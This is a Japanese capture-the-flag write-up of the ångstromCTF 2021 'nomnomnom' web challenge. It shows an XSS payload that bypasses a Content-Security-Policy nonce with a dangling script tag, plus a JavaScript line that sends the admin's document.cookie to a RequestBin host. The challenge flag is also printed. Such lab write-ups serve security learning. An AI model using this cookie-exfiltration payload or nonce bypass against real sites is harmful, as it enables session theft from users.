# nomnomnom:Web:130pts
I've made a new game that is sure to make all the Venture Capitalists want to invest! Care to try it out?  
[NOM NOM NOM (the game)](https://nomnomnom.2021.chall.actf.co/)  
[source](deploy.zip)  
Hint  
Can you [beat my score](https://nomnomnom.2021.chall.actf.co/shares/hint)?

# Solution
アクセスするとゲームが置いてある。  
どうやらスコアをシェアできるようだ。  
snek nomnomnom  
[site1.png](site/site1.png)  
どう考えてもXSS問である。  
以下のように名前でXSSができるが、CSPがあるためブロックされる。  
```html
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-4e93f214cc76bd6c734ede0f3f86ccc0'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of 1! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by <script>alert(1)</script>
		<script nonce='4e93f214cc76bd6c734ede0f3f86ccc0'>
function report() {
	fetch('/report/a903395ddf2d621d', {
		method: 'POST'
	})
}

document.getElementById('reporter').onclick = () => { report() }
		</script> 
		
	</body>
</html>
```
名前挿入箇所の後ろにこれ見よがしにnonceが書かれている。  
以下のようにscriptタグを入れ込むとnonceを取り込むことができる。  
jsのアップロードは[TextBin](https://textbin.net/)を用いた。  
```html
<script src="https://textbin.net/raw/o4tst0cpr6" dummy=\
```
```JavaScript
location.href = 'https://enf7ula6130xw.x.pipedream.net/?cookie=' + document.cookie;
// https://enf7ula6130xw.x.pipedream.net/ <- RequestBin.com
```
結果は次のようになる。  
```html
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-c339418395e04e47d23911f610a5e86e'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of 1! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by <script src="https://textbin.net/raw/o4tst0cpr6" dummy=\
		<script nonce='c339418395e04e47d23911f610a5e86e'>
function report() {
	fetch('/report/444c9aa519fbcc84', {
		method: 'POST'
	})
}

document.getElementById('reporter').onclick = () => { report() }
		</script> 
		
	</body>
</html>
```
即座にリダイレクトしてしまうため、読み込みを中断してコンソールより以下を実行する。  
curlでPOSTしてもよい。  
```JavaScript
fetch('/report/933aca6a5e744751', {
	method: 'POST'
})
```
すると以下のcookieが手に入る。  
```
no_this_is_not_the_challenge_go_away=b737f9727c292ab8071ea8f6fd49fc85d15afc26d5557740bed750ab44b2ef94f0fd7509afe74bb5bffbeb52c99c81aadafa7923e0bb83799236cef429c3e4f6
```
何やら書いてあるが、無視して自身のcookieに設定する。  
ゲームをクリアするとflagが書かれていた。  
flag  
[flag.png](site/flag.png)  

## actf{w0ah_the_t4g_n0mm3d_th1ng5}